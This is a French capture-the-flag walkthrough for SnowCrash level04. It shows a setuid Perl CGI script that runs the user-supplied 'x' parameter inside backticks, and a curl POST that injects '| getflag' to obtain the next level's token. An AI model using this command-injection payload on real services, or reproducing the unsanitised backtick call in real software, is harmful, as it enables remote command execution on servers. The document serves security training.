# 04 - Perl exploit: entrée utilisateur

- On se connecte en tant que level04.
```
level04@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag04 level04 152 Mar  5  2016 level04.pl
level04@SnowCrash:~$ cat ./level04.pl
```
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```


- Le script semble être conçu pour être exécuté par un [CGI](https://en.wikipedia.org/wiki/Common_Gateway_Interface) à travers un service écoutant en local sur le port 4747. Il appelle la fonction `x()` avec le paramètre `x` récupéré.

- La fonction `x()` prépare l'instruction qui sera executée côté serveur en utilisant le paramètre `x` récupéré du CGI. Ainsi, le serveur va `echo <notre_input>`.
```
level04@SnowCrash:~$ netstat -tuln | grep 4747
tcp6       0      0 :::4747                 :::*                    LISTEN
```


- Il y a effectivement un service écoutant sur toutes les adresses par le port 4747.
```
level04@SnowCrash:~$ curl -X POST -d "x=| getflag" http://localhost:4747
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

```
level04@SnowCrash:~$ su level05
Password:ne2searoevaevoem4ov4ar8ap
level05@SnowCrash:~$
```